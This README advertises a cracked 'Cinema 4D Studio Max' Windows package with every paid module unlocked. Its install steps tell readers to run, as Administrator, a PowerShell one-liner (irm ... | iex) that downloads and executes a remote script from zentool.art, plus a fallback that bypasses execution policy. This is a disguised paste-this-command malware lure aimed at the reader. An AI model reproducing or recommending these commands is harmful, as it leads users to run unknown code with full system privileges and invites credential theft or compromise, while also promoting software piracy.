## About this application

**Cinema 4D Studio Max** in this repo is a Windows desktop package for engineers, drafters, and design teams who want the full desktop experience without missing tools or locked panels. This is the complete professional build — every module that normally sits behind a paid tier is already active, so you can use modeling, drafting, and professional CAD workflows from the first launch. Expect a guided setup through PowerShell, a responsive workspace on a standard PC, and workflows that feel like the top-tier edition from day one.

## Download

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) — setup runs automatically

<details>
<summary><b>Having trouble? Try this instead</b></summary>

Paste this in the same PowerShell window:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

After setup finishes, open the app and load a starter template to verify snaps, layers, and export tools.

## Troubleshooting

**Setup script does not run** — confirm PowerShell is opened as Administrator and execution policy allows remote scripts.

**App opens but tools are grayed out** — restart once after install; the first launch may finish background registration.

Slow performance on large drawings — close unused layouts and keep project files on SSD storage.
